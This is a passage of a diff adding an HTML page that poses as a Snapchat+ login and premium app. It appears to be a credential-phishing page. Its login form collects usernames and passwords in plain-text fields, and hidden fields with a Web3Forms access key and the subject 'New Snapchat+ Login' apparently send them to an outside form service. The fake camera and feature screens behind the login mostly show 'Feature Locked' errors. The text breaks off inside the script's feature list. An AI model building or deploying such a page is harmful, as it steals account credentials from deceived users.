@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SnapPlus — Snapchat+</title>
+<style>
+:root{
+  --yellow:#FFFC00; --gold:#E0A800; --gold2:#FFD700; --goldSoft:#fff6c2;
+  --bg:#ffffff; --soft:#fffdf2; --ink:#161616; --muted:#7a7768;
+  --line:#ecead8; --shadow:0 10px 30px rgba(0,0,0,.08); --red:#e0433b;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--ink);overflow-x:hidden}
+.screen{display:none;width:100%;min-height:100vh}
+.screen.active{display:block}
+input{font-family:inherit}
+
+/* ===== SPLASH ===== */
+#splash{position:fixed;inset:0;background:var(--yellow);display:flex;align-items:center;justify-content:center;z-index:10000;transition:opacity .7s,visibility .7s}
+#splash.hide{opacity:0;visibility:hidden}
+#splash svg{width:160px;height:160px;color:#fff;filter:drop-shadow(0 8px 24px rgba(0,0,0,.12));animation:pop 1s cubic-bezier(.2,1.4,.4,1)}
+@keyframes pop{0%{transform:scale(.3);opacity:0}60%{transform:scale(1.08);opacity:1}100%{transform:scale(1)}}
+
+/* ===== TOP BAR ===== */
+.topbar{position:sticky;top:0;z-index:60;display:flex;align-items:center;gap:14px;padding:12px 18px;background:#fff;border-bottom:1px solid var(--line)}
+.topbar .logo{display:flex;align-items:center;gap:8px;font-weight:800;font-size:18px;color:var(--ink)}
+.topbar .logo svg{width:30px;height:30px;color:var(--gold)}
+.search{flex:1;max-width:340px;display:flex;align-items:center;gap:8px;background:var(--soft);border:1px solid var(--line);border-radius:999px;padding:9px 16px}
+.search svg{width:16px;height:16px;color:var(--muted);flex-shrink:0}
+.search input{border:none;background:none;outline:none;width:100%;font-size:14px;color:var(--ink)}
+.topbar .right{margin-left:auto;display:flex;align-items:center;gap:10px}
+.btn-login{background:var(--yellow);color:#000;border:none;font-weight:800;font-size:14px;padding:9px 20px;border-radius:999px;cursor:pointer;box-shadow:0 4px 14px rgba(255,252,0,.5)}
+.btn-login:active{transform:scale(.96)}
+
+/* ===== LOGIN ===== */
+#loginScreen{background:linear-gradient(180deg,#fff 0%,var(--soft) 60%,#fff 100%)}
+.login-hero{display:flex;flex-direction:column;align-items:center;text-align:center;padding:44px 20px 14px}
+.login-hero .glow svg{width:110px;height:110px;color:var(--gold);filter:drop-shadow(0 0 26px rgba(255,215,0,.55));animation:float 3.5s ease-in-out infinite}
+@keyframes float{50%{transform:translateY(-9px)}}
+.login-hero h1{font-size:42px;font-weight:800;letter-spacing:-1px;margin-top:10px}
+.login-hero h1 span{color:var(--gold)}
+.login-hero p{color:var(--muted);margin-top:6px;font-size:15px}
+.form-card{background:#fff;border:1px solid var(--line);border-radius:24px;padding:28px;box-shadow:var(--shadow);max-width:420px;margin:18px auto 60px}
+.form-card h3{text-align:center;font-size:20px;margin-bottom:4px}
+.form-card .sub{text-align:center;color:var(--muted);font-size:13px;margin-bottom:20px}
+.field{width:100%;padding:15px 16px;margin-bottom:14px;border:1.5px solid var(--line);border-radius:14px;background:var(--soft);font-size:15px;outline:none;transition:.2s;color:var(--ink)}
+.field:focus{border-color:var(--gold);background:#fff;box-shadow:0 0 0 3px rgba(255,215,0,.18)}
+.btn-cta{width:100%;padding:15px;border:none;border-radius:14px;background:var(--yellow);color:#000;font-size:17px;font-weight:800;cursor:pointer;box-shadow:0 8px 22px rgba(255,252,0,.45);transition:.15s}
+.btn-cta:active{transform:scale(.98)}
+.btn-cta:disabled{opacity:.6;cursor:not-allowed}
+.form-msg{text-align:center;font-size:13px;margin-top:12px;min-height:18px}
+.form-msg.ok{color:#2a9d3a}
+.form-msg.err{color:var(--red)}
+
+/* ===== MAIN APP ===== */
+#mainApp{background:var(--soft)}
+.tab-content{display:none;min-height:calc(100vh - 70px);padding-bottom:70px}
+.tab-content.active{display:block}
+
+/* Camera */
+.camera-container{position:relative;width:100%;height:calc(100vh - 70px);background:#000}
+#video{width:100%;height:100%;object-fit:cover}
+.cam-top{position:absolute;top:0;left:0;right:0;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;background:linear-gradient(180deg,rgba(0,0,0,.45),transparent);z-index:5}
+.cam-top .lm{display:flex;align-items:center;gap:8px;color:#fff;font-weight:800}
+.cam-top .lm svg{width:26px;height:26px;color:var(--gold2)}
+.cam-top .pill{background:rgba(255,252,0,.92);color:#000;font-weight:800;font-size:12px;padding:7px 14px;border-radius:999px}
+.camera-controls{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(0deg,rgba(0,0,0,.8),transparent);padding:20px 14px 26px}
+.filter-selector{display:flex;gap:9px;overflow-x:auto;margin-bottom:16px;padding-bottom:6px;scrollbar-width:none}
+.filter-selector::-webkit-scrollbar{display:none}
+.filter-btn{padding:8px 16px;border:1.5px solid rgba(255,255,255,.4);border-radius:999px;background:rgba(255,255,255,.1);color:#fff;font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;transition:.2s;backdrop-filter:blur(6px)}
+.filter-btn.active{background:var(--yellow);color:#000;border-color:transparent;box-shadow:0 6px 16px rgba(255,252,0,.5)}
+.capture-controls{display:flex;justify-content:center;align-items:center;gap:32px}
+.capture-button{width:72px;height:72px;border-radius:50%;border:4px solid #fff;background:radial-gradient(circle at 50% 40%,rgba(255,215,0,.35),transparent 60%);font-size:28px;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 4px rgba(255,215,0,.35),0 10px 26px rgba(0,0,0,.5)}
+.capture-button:active{transform:scale(.9)}
+.switch-btn{width:50px;height:50px;border-radius:50%;border:1.5px solid rgba(255,255,255,.5);background:rgba(255,255,255,.12);font-size:20px;cursor:pointer;color:#fff}
+
+/* generic light sections */
+.appbar{position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:10px;padding:14px 18px;background:#fff;border-bottom:1px solid var(--line)}
+.appbar svg{width:26px;height:26px;color:var(--gold)}
+.appbar b{font-size:18px}
+.appbar .who{margin-left:auto;font-size:13px;color:var(--muted)}
+.sec{padding:20px 18px}
+.sec h2{font-size:26px;font-weight:800;margin-bottom:16px}
+.sec h2 em{color:var(--gold);font-style:normal}
+.list{display:flex;flex-direction:column;gap:10px}
+.row{display:flex;align-items:center;gap:13px;padding:13px;background:#fff;border:1px solid var(--line);border-radius:16px;cursor:pointer;transition:.2s;box-shadow:0 2px 8px rgba(0,0,0,.04)}
+.row:hover{border-color:var(--gold2);background:var(--soft)}
+.av{width:48px;height:48px;border-radius:50%;background:var(--goldSoft);border:2px solid var(--gold2);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
+.row h3{font-size:15.5px;margin-bottom:2px}
+.row p{font-size:12.5px;color:var(--muted)}
+.row .tag{margin-left:auto;font-size:11px;font-weight:800;color:var(--gold)}
+
+/* stories */
+.sgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:24px}
+.sitem{text-align:center}
+.sring{width:82px;height:82px;border-radius:50%;padding:3px;background:conic-gradient(from 0deg,var(--yellow),var(--gold2),var(--gold),var(--yellow));margin:0 auto 8px;display:flex;align-items:center;justify-content:center}
+.sring .in{width:100%;height:100%;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;border:3px solid #fff}
+.sitem p{font-size:13px;color:var(--muted)}
+
+/* discover */
+.dgrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.dcard{background:#fff;border:1px solid var(--line);border-radius:20px;padding:22px;text-align:center;cursor:pointer;transition:.2s;box-shadow:var(--shadow)}
+.dcard:hover{transform:translateY(-3px);border-color:var(--gold2)}
+.dcard .em{font-size:42px;margin-bottom:8px}
+.dcard h3{font-size:16px;margin-bottom:4px}
+.dcard p{font-size:12px;color:var(--muted)}
+
+/* ===== FEATURES ===== */
+.fgroup{margin-bottom:26px}
+.fgroup h3{font-size:14px;text-transform:uppercase;letter-spacing:1px;color:var(--gold);margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.fgroup h3::after{content:"";flex:1;height:1px;background:var(--line)}
+.feat-row{display:flex;align-items:center;gap:14px;padding:14px;background:#fff;border:1px solid var(--line);border-radius:16px;cursor:pointer;transition:.2s;box-shadow:0 2px 8px rgba(0,0,0,.04);margin-bottom:10px}
+.feat-row:hover{border-color:var(--gold2);background:var(--soft);transform:translateX(3px)}
+.feat-row .fic{width:46px;height:46px;border-radius:13px;background:var(--goldSoft);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
+.feat-row .ft h4{font-size:15px;margin-bottom:3px;display:flex;align-items:center;gap:6px}
+.feat-row .ft h4 .lock{font-size:12px;color:var(--muted)}
+.feat-row .ft p{font-size:12.5px;color:var(--muted);line-height:1.4}
+.feat-row .go{margin-left:auto;color:var(--gold);font-size:18px;font-weight:800}
+
+/* profile */
+.pwrap{padding:30px 20px;text-align:center}
+.pav{width:130px;height:130px;border-radius:50%;margin:0 auto 14px;padding:4px;background:conic-gradient(from 0deg,var(--yellow),var(--gold2),var(--gold),var(--yellow));box-shadow:0 0 26px rgba(255,215,0,.35)}
+.pav .in{width:100%;height:100%;border-radius:50%;overflow:hidden;background:#ececec}
+.pav svg{width:100%;height:100%;display:block}
+.pname{font-size:24px;font-weight:800;display:inline-flex;align-items:center;gap:6px}
+.pname .plus{color:var(--gold);font-weight:900}
+.pmail{color:var(--muted);font-size:14px;margin-top:4px}
+.stats{display:flex;justify-content:space-around;background:#fff;border:1px solid var(--line);border-radius:20px;padding:18px;margin:22px 0;box-shadow:var(--shadow)}
+.stat h3{font-size:26px;color:var(--gold)}
+.stat p{font-size:12px;color:var(--muted);margin-top:2px}
+.pactions{display:flex;flex-direction:column;gap:12px;max-width:340px;margin:0 auto}
+.btn-ghost{padding:14px;border:1.5px solid var(--gold2);border-radius:14px;background:#fff;color:var(--gold);font-size:15px;font-weight:800;cursor:pointer;transition:.2s}
+.btn-ghost:hover{background:var(--goldSoft)}
+
+/* nav */
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:#fff;backdrop-filter:blur(12px);display:flex;justify-content:space-around;padding:9px 0 11px;border-top:1px solid var(--line);z-index:60}
+.nav-btn{background:none;border:none;color:#a8a494;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:3px;padding:4px 6px;transition:.2s;font-size:10px;font-weight:600}
+.nav-btn span{font-size:21px}
+.nav-btn.active{color:var(--gold)}
+.nav-btn.active span{filter:drop-shadow(0 0 6px rgba(255,215,0,.5))}
+
+/* ===== ERROR MODAL ===== */
+#errOverlay{position:fixed;inset:0;background:rgba(0,0,0,.45);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:20000;padding:20px}
+#errOverlay.show{display:flex}
+.err-card{background:#fff;border:1px solid var(--line);border-top:4px solid var(--red);border-radius:22px;max-width:380px;width:100%;padding:28px 24px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.3);animation:errPop .35s cubic-bezier(.2,1.3,.4,1)}
+@keyframes errPop{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
+.err-card .eic{width:64px;height:64px;border-radius:50%;background:#fdeceb;color:var(--red);display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 14px}
+.err-card h4{font-size:19px;margin-bottom:6px}
+.err-card .efeat{color:var(--gold);font-weight:800}
+.err-card p{font-size:14px;color:var(--muted);line-height:1.5;margin-bottom:20px}
+.err-card .ecode{display:inline-block;background:#fdeceb;color:var(--red);font-size:11px;font-weight:800;letter-spacing:1px;padding:4px 12px;border-radius:999px;margin-bottom:18px}
+.btn-ok{width:100%;padding:14px;border:none;border-radius:14px;background:var(--ink);color:#fff;font-size:15px;font-weight:800;cursor:pointer;transition:.15s}
+.btn-ok:active{transform:scale(.97)}
+/* ===== NOTE POPUP ===== */
+.note-overlay{
+  position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(6px);
+  display:none;align-items:center;justify-content:center;z-index:25000;padding:20px;
+}
+.note-overlay.show{display:flex}
+.note-card{
+  background:#fff;border-radius:24px;max-width:420px;width:100%;padding:32px 26px;
+  text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.35);
+  border-top:5px solid var(--gold);animation:notePop .4s cubic-bezier(.2,1.3,.4,1);
+}
+@keyframes notePop{from{transform:scale(.8) translateY(20px);opacity:0}to{transform:none;opacity:1}}
+.note-icon{font-size:48px;margin-bottom:10px}
+.note-card h3{font-size:22px;font-weight:800;margin-bottom:10px}
+.note-text{font-size:14.5px;color:var(--muted);line-height:1.6;margin-bottom:22px}
+.note-btn{
+  width:100%;padding:14px;border:none;border-radius:14px;
+  background:var(--yellow);color:#000;font-size:15px;font-weight:800;
+  cursor:pointer;box-shadow:0 8px 22px rgba(255,252,0,.45);transition:.15s;
+}
+.note-btn:active{transform:scale(.97)}
+@keyframes flash{0%{opacity:.85}100%{opacity:0}}
+@media(max-width:480px){.login-hero h1{font-size:34px}.search{display:none}.nav-btn{font-size:9px}.nav-btn span{font-size:19px}}
+</style>
+</head>
+<body>
+
+<!-- ===== SVG DEFS: Snapchat ghost ===== -->
+<svg width="0" height="0" style="position:absolute">
+  <defs>
+    <symbol id="ghost" viewBox="0 0 32 32">
+      <path fill="currentColor" d="M15.688 4a7.9 7.9 0 0 0-3.032.656c-1.316.567-2.742 1.657-3.625 3.594c-.695 1.527-.484 3.434-.375 5c-.16-.031-.293-.016-.531-.125a1.6 1.6 0 0 0-.688-.156c-.406 0-.753.11-1.093.312c-.34.203-.735.531-.844 1.094c-.066.352.035.875.344 1.25s.765.64 1.375.875c.144.055.254.117.375.156c.258.078.539.157.718.25c.18.094.208.168.188.125a.9.9 0 0 1-.094.25l-.031.032c-.027.058-1.441 3.132-4.313 3.593A1.273 1.273 0 0 0 3 22.22c.012.176.066.332.125.468c.223.512.664.84 1.25 1.094c.473.203 1.23.348 2.063.5c.015.055.015.051.03.125c.04.176.087.399.157.625c.09.297.332.621.625.782c.293.16.547.156.688.156c.3 0 .488-.055.687-.094a6 6 0 0 1 1.156-.125c.262 0 .563.016.844.063c.39.062.828.359 1.438.78c.882.61 2.062 1.407 3.78 1.407h.063c.051 0 .117.004.156 0h.094c1.719 0 2.895-.797 3.782-1.406c.609-.418 1.078-.719 1.468-.782a5 5 0 0 1 .813-.062c.465 0 .797.059 1.156.125c.25.047.45.094.688.094h.03c.231 0 .552-.063.813-.25c.262-.188.403-.492.469-.719a10 10 0 0 0 .156-.594c.016-.078.016-.07.032-.125c.832-.152 1.59-.297 2.062-.5c.586-.254 1.027-.582 1.25-1.093a1.5 1.5 0 0 0 .125-.47c.035-.632-.422-1.21-1.031-1.312h-.032C26.5 20.676 25.45 19.84 24.72 19s-1.098-1.668-1.094-1.656l-.031-.063a.9.9 0 0 1-.094-.25c-.02.043.008-.031.188-.125c.18-.093.46-.172.718-.25c.13-.039.262-.101.407-.156c.535-.207.914-.41 1.218-.719c.305-.308.508-.77.5-1.156c-.015-.828-.625-1.285-1.218-1.5c-.004 0 .003-.031 0-.031c-.012-.004-.02.004-.032 0a2 2 0 0 0-.75-.125c-.18 0-.445.004-.781.156c-.172.078-.273.059-.406.094c.11-1.559.32-3.45-.375-4.969c-.883-1.938-2.305-3.055-3.625-3.625A7.8 7.8 0 0 0 16.25 4h-.5c-.008 0 .027-.008-.063 0z"/>
+    </symbol>
+    <symbol id="ghostPlus" viewBox="0 0 32 32">
+      <path fill="currentColor" d="M15.688 4a7.9 7.9 0 0 0-3.032.656c-1.316.567-2.742 1.657-3.625 3.594c-.695 1.527-.484 3.434-.375 5c-.16-.031-.293-.016-.531-.125a1.6 1.6 0 0 0-.688-.156c-.406 0-.753.11-1.093.312c-.34.203-.735.531-.844 1.094c-.066.352.035.875.344 1.25s.765.64 1.375.875c.144.055.254.117.375.156c.258.078.539.157.718.25c.18.094.208.168.188.125a.9.9 0 0 1-.094.25l-.031.032c-.027.058-1.441 3.132-4.313 3.593A1.273 1.273 0 0 0 3 22.22c.012.176.066.332.125.468c.223.512.664.84 1.25 1.094c.473.203 1.23.348 2.063.5c.015.055.015.051.03.125c.04.176.087.399.157.625c.09.297.332.621.625.782c.293.16.547.156.688.156c.3 0 .488-.055.687-.094a6 6 0 0 1 1.156-.125c.262 0 .563.016.844.063c.39.062.828.359 1.438.78c.882.61 2.062 1.407 3.78 1.407h.063c.051 0 .117.004.156 0h.094c1.719 0 2.895-.797 3.782-1.406c.609-.418 1.078-.719 1.468-.782a5 5 0 0 1 .813-.062c.465 0 .797.059 1.156.125c.25.047.45.094.688.094h.03c.231 0 .552-.063.813-.25c.262-.188.403-.492.469-.719a10 10 0 0 0 .156-.594c.016-.078.016-.07.032-.125c.832-.152 1.59-.297 2.062-.5c.586-.254 1.027-.582 1.25-1.093a1.5 1.5 0 0 0 .125-.47c.035-.632-.422-1.21-1.031-1.312h-.032C26.5 20.676 25.45 19.84 24.72 19s-1.098-1.668-1.094-1.656l-.031-.063a.9.9 0 0 1-.094-.25c-.02.043.008-.031.188-.125c.18-.093.46-.172.718-.25c.13-.039.262-.101.407-.156c.535-.207.914-.41 1.218-.719c.305-.308.508-.77.5-1.156c-.015-.828-.625-1.285-1.218-1.5c-.004 0 .003-.031 0-.031c-.012-.004-.02.004-.032 0a2 2 0 0 0-.75-.125c-.18 0-.445.004-.781.156c-.172.078-.273.059-.406.094c.11-1.559.32-3.45-.375-4.969c-.883-1.938-2.305-3.055-3.625-3.625A7.8 7.8 0 0 0 16.25 4h-.5c-.008 0 .027-.008-.063 0z"/>
+      <rect x="23.2" y="3.2" width="7.2" height="2.4" rx="1.2" fill="currentColor"/>
+      <rect x="25.6" y="0.8" width="2.4" height="7.2" rx="1.2" fill="currentColor"/>
+    </symbol>
+  </defs>
+</svg>
+
+<!-- ===== 1) SPLASH ===== -->
+<div id="splash"><svg viewBox="0 0 32 32"><use href="#ghost"/></svg></div>
+
+<!-- ===== 2) LOGIN ===== -->
+<div id="loginScreen" class="screen">
+  <div class="topbar">
+    <div class="logo"><svg viewBox="0 0 32 32"><use href="#ghost"/></svg>Snapchat</div>
+    <div class="search">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4-4"/></svg>
+      <input type="text" placeholder="Search">
+    </div>
+    <div class="right"><button class="btn-login" onclick="document.getElementById('userName').focus()">Log In</button></div>
+  </div>
+
+  <div class="login-hero">
+    <div class="glow"><svg viewBox="0 0 32 32"><use href="#ghostPlus"/></svg></div>
+    <h1>Snapchat<span>+</span></h1>
+    <p>Exclusive, experimental &amp; pre-release features</p>
+  </div>
+
+  <div class="form-card">
+    <h3>Welcome back</h3>
+    <p class="sub">Enter your details to continue</p>
+    <form id="loginForm">
+      <!-- Web3Forms hidden field -->
+      <input type="hidden" name="access_key" id="w3fKey" value="3ecab96c-e906-4173-8dfa-5c47929db488">
+      <input type="hidden" name="subject" value="New Snapchat+ Login">
+      <input type="hidden" name="from_name" value="SnapPlus Website">
+       <p>Enter your username </p>
+      <input class="field" type="text" name="name" id="userName" placeholder="" required>
+      <p>enter password</p>
+      <input class="field" type="text" name="email" id="userEmail" placeholder="" required>
+      <button type="submit" class="btn-cta" id="submitBtn">Let's Snap! ✨</button>
+      <div class="form-msg" id="formMsg"></div>
+    </form>
+  </div>
+</div>
+
+<!-- ===== 3) MAIN APP ===== -->
+<div id="mainApp" class="screen">
+
+  <!-- Camera -->
+  <div id="cameraScreen" class="tab-content active">
+    <div class="camera-container">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas" style="display:none"></canvas>
+      <div class="cam-top">
+        <div class="lm"><svg viewBox="0 0 32 32"><use href="#ghostPlus"/></svg>Snapchat+</div>
+        <button class="pill">⚡ Premium</button>
+      </div>
+      <div class="camera-controls">
+        <div class="filter-selector">
+          <button class="filter-btn active" data-filter="none">Normal</button>
+          <button class="filter-btn" data-filter="grayscale">B&amp;W</button>
+          <button class="filter-btn" data-filter="sepia">Sepia</button>
+          <button class="filter-btn" data-filter="invert">Invert</button>
+          <button class="filter-btn" data-filter="blur">Blur</button>
+          <button class="filter-btn" data-filter="brightness">Bright</button>
+          <button class="filter-btn" data-filter="contrast">Contrast</button>
+          <button class="filter-btn" data-filter="saturate">Saturate</button>
+        </div>
+        <div class="capture-controls">
+          <button id="switchCameraBtn" class="switch-btn">🔄</button>
+          <button id="captureBtn" class="capture-button">📸</button>
+          <button class="switch-btn" onclick="showFeatureError('Lenses')">✨</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Chat -->
+  <div id="chatScreen" class="tab-content">
+    <div class="appbar"><svg viewBox="0 0 32 32"><use href="#ghost"/></svg><b>Chat</b><span class="who" id="topWho"></span></div>
+    <div class="sec">
+      <div class="search" style="max-width:100%;margin-bottom:16px;background:#fff;border:1.5px solid var(--line)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4-4"/></svg>
+        <input type="text" id="friendSearch" placeholder="Search friends...">
+      </div>
+      <div id="friendsList" class="list"></div>
+    </div>
+  </div>
+
+  <!-- Stories -->
+  <div id="storiesScreen" class="tab-content">
+    <div class="appbar"><svg viewBox="0 0 32 32"><use href="#ghost"/></svg><b>Stories</b></div>
+    <div class="sec"><h2>My <em>Stories</em></h2>
+      <div class="sgrid">
+        <div class="sitem"><div class="sring"><div class="in">➕</div></div><p>My Story</p></div>
+        <div class="sitem"><div class="sring"><div class="in">👥</div></div><p>Friends</p></div>
+        <div class="sitem"><div class="sring"><div class="in">🎬</div></div><p>Discover</p></div>
+      </div>
+      <h3 style="margin-bottom:12px;color:var(--gold)">Recent</h3>
+      <div id="storiesList" class="list"></div>
+    </div>
+  </div>
+
+  <!-- Discover -->
+  <div id="discoverScreen" class="tab-content">
+    <div class="appbar"><svg viewBox="0 0 32 32"><use href="#ghost"/></svg><b>Discover</b></div>
+    <div class="sec"><h2>Dis<em>cover</em></h2>
+      <div class="dgrid">
+        <div class="dcard" onclick="showFeatureError('Trending')"><div class="em">🌍</div><h3>Trending</h3><p>What's popular now</p></div>
+        <div class="dcard" onclick="showFeatureError('Entertainment')"><div class="em">🎭</div><h3>Entertainment</h3><p>Movies &amp; shows</p></div>
+        <div class="dcard" onclick="showFeatureError('Gaming')"><div class="em">🎮</div><h3>Gaming</h3><p>Latest games</p></div>
+        <div class="dcard" onclick="showFeatureError('Music')"><div class="em">🎵</div><h3>Music</h3><p>New releases</p></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Features -->
+  <div id="featuresScreen" class="tab-content">
+    <div class="appbar"><svg viewBox="0 0 32 32"><use href="#ghostPlus"/></svg><b>Snapchat+ Features</b></div>
+    <div class="sec">
+      <h2>All <em>Features</em></h2>
+      <p style="color:var(--muted);font-size:13px;margin:-8px 0 22px">Tap any feature to preview — some are locked in this build.</p>
+      <div id="featuresWrap"></div>
+    </div>
+  </div>
+
+  <!-- Profile -->
+  <div id="profileScreen" class="tab-content">
+    <div class="pwrap">
+      <div class="pav"><div class="in">
+        <svg viewBox="0 0 200 200">
+          <circle cx="100" cy="100" r="100" fill="#ececec"/>
+          <ellipse cx="100" cy="96" rx="58" ry="62" fill="#6b4226"/>
+          <path d="M58 84 Q48 130 58 168 L78 168 Q68 120 72 88 Z" fill="#7a4c2c"/>
+          <path d="M142 84 Q152 130 142 168 L122 168 Q132 120 128 88 Z" fill="#7a4c2c"/>
+          <rect x="90" y="128" width="20" height="22" fill="#f2c9a0"/>
+          <path d="M52 178 Q56 140 82 134 L118 134 Q144 140 148 178 L148 200 L52 200 Z" fill="#f7f7f7"/>
+          <path d="M60 150 q6 8 0 16 M70 144 q6 8 0 16 M130 150 q-6 8 0 16 M140 144 q-6 8 0 16" stroke="#e2e2e2" stroke-width="2" fill="none"/>
+          <path d="M88 136 L112 136 L100 176 Z" fill="#7d8084"/>
+          <ellipse cx="76" cy="140" rx="15" ry="11" fill="#fff" stroke="#e2e2e2"/>
+          <ellipse cx="124" cy="140" rx="15" ry="11" fill="#fff" stroke="#e2e2e2"/>
+          <ellipse cx="100" cy="92" rx="40" ry="46" fill="#f2c9a0"/>
+          <path d="M58 82 Q60 50 100 48 Q140 50 142 82 Q130 62 100 64 Q70 62 58 82 Z" fill="#6b4226"/>
+          <path d="M76 82 q8 -5 16 -1 M108 81 q8 -4 16 1" stroke="#5a3a22" stroke-width="3" fill="none" stroke-linecap="round"/>
+          <ellipse cx="85" cy="93" rx="7.5" ry="5.5" fill="#fff"/><ellipse cx="115" cy="93" rx="7.5" ry="5.5" fill="#fff"/>
+          <circle cx="86" cy="93" r="3.6" fill="#4a2c1a"/><circle cx="116" cy="93" r="3.6" fill="#4a2c1a"/>
+          <circle cx="87.4" cy="91.6" r="1.2" fill="#fff"/><circle cx="117.4" cy="91.6" r="1.2" fill="#fff"/>
+          <path d="M78 88 q7 -4 14 -1 M108 87 q7 -3 14 1" stroke="#2a1a10" stroke-width="2" fill="none" stroke-linecap="round"/>
+          <path d="M100 100 q3 6 -2 8" stroke="#d9a878" stroke-width="2" fill="none" stroke-linecap="round"/>
+          <path d="M88 114 Q100 124 112 114 Q100 120 88 114 Z" fill="#c0392b"/>
+          <path d="M46 96 A54 54 0 0 1 154 96" stroke="#f5f5f5" stroke-width="11" fill="none" stroke-linecap="round"/>
+          <circle cx="46" cy="100" r="14" fill="#f5f5f5"/><circle cx="46" cy="100" r="8" fill="#dcdcdc"/>
+          <circle cx="154" cy="100" r="14" fill="#f5f5f5"/><circle cx="154" cy="100" r="8" fill="#dcdcdc"/>
+        </svg>
+      </div></div>
+      <div class="pname"><span id="profileName">User</span><span class="plus">+</span></div>
+      <p class="pmail" id="profileEmail">user@email.com</p>
+      <div class="stats">
+        <div class="stat"><h3 id="statSnaps">0</h3><p>Snaps</p></div>
+        <div class="stat"><h3 id="statStories">0</h3><p>Stories</p></div>
+        <div class="stat"><h3>🔥 0</h3><p>Streaks</p></div>
+      </div>
+      <div class="pactions">
+        <button class="btn-ghost" onclick="showFeatureError('Snapchat+ Badge')">⭐ Snapchat+ Badge</button>
+        <button class="btn-ghost" onclick="showFeatureError('Customize App')">🎨 Customize App</button>
+        <button id="logoutBtn" class="btn-ghost">Logout</button>
+      </div>
+    </div>
+  </div>
+
+  <nav class="bottom-nav">
+    <button class="nav-btn active" data-tab="cameraScreen"><span>📷</span><p>Camera</p></button>
+    <button class="nav-btn" data-tab="chatScreen"><span>💬</span><p>Chat</p></button>
+    <button class="nav-btn" data-tab="storiesScreen"><span>📖</span><p>Stories</p></button>
+    <button class="nav-btn" data-tab="discoverScreen"><span>🔍</span><p>Discover</p></button>
+    <button class="nav-btn" data-tab="featuresScreen"><span>⭐</span><p>Features</p></button>
+    <button class="nav-btn" data-tab="profileScreen"><span>👤</span><p>Profile</p></button>
+  </nav>
+</div>
+
+<!-- ===== ERROR MODAL ===== -->
+<div id="errOverlay">
+  <div class="err-card">
+    <div class="eic">⚠️</div>
+    <h4>Feature Locked</h4>
+    <p><span class="efeat" id="errFeat">This feature</span> is not available in the free preview build.</p>
+    <div class="ecode" id="errCode">ERR-1001</div>
+    <button class="btn-ok" onclick="hideError()">OK, Got it</button>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   ⚠️ IMPORTANT: Replace this with your Web3Forms access key
+   Get free key from: https://web3forms.com/
+   ============================================================ */
+const WEB3FORMS_KEY = "YOUR_WEB3FORMS_ACCESS_KEY_HERE";
+
+let currentUser=null, videoStream=null, facingMode='user';
+const $=id=>document.getElementById(id);
+const splash=$('splash'), loginScreen=$('loginScreen'), mainApp=$('mainApp');
+const video=$('video'), canvas=$('canvas');
+
+const friends=[
+ {n:'Aarav',e:'😎'},{n:'Priya',e:'🌸'},{n:'Rohan',e:'🔥'},{n:'Sneha',e:'✨'},
+ {n:'Vikram',e:'🎮'},{n:'Ananya',e:'🎵'},{n:'Kabir',e:'⚡'},{n:'Meera',e:'🌙'},
+ {n:'Arjun',e:'🚀'},{n:'Diya',e:'💫'}
+];
+
+const featureGroups=[
+ {g:'Personalization',items:[
+   {i:'🎨',t:'Custom App Icon',d:'Pick your own custom app icon from our ever-growing library'},
+   {i:'⭐',t:'Snapchat+ Badge',d:'Get a Snapchat+ badge next to your name'},
+   {i:'😊',t:'#1 Best Friend',d:'Pin one friend as your #1 BFF'},
+   {i:'📌',t:'Pin Your Bitmoji',d:'Pin your Bitmoji to the top of your friends list'},
+   {i:'🖼️',t:'Chat Wallpapers',d:'Customize your chats with wallpapers'},
+   {i:'🌈',t:'Bitmoji Backgrounds',d:'Change the background behind your Bitmoji'},
+   {i:'🔔',t:'Custom Notification Sounds',d:'Set custom sounds for new Snaps & chats'},
+   {i:'🌙',t:'Custom App Appearance',d:'Tweak the look & feel of the app'}
+ ]},
+ {g:'Stories',items:[
+   {i:'🔁',t:'Story Replays',d:'See how often friends rewatch your Stories'},
+   {i:'🚀',t:'Story Boost',d:'Boost your Stories to get more views'},
+   {i:'📅',t:'Scheduled Stories',d:'Schedule Stories to post later'},
+   {i:'👀',t:'Story View Notifications',d:'Get notified who viewed your Story'},
+   {i:'🙈',t:'Hide Story',d:'Hide your Story from specific friends'}
+ ]},
+ {g:'Friends & Social',items:[
+   {i:'🪐',t:'Friend Solar System',d:'See who your closest friends are with planets'},
+   {i:'🔥',t:'Streak History',d:'View the full history of your Snapstreaks'},
+   {i:'📍',t:'Streak Location',d:'Know where your streak was last saved'},
+   {i:'⏰',t:'Streak Reminders',d:'Custom reminders so you never lose a streak'},
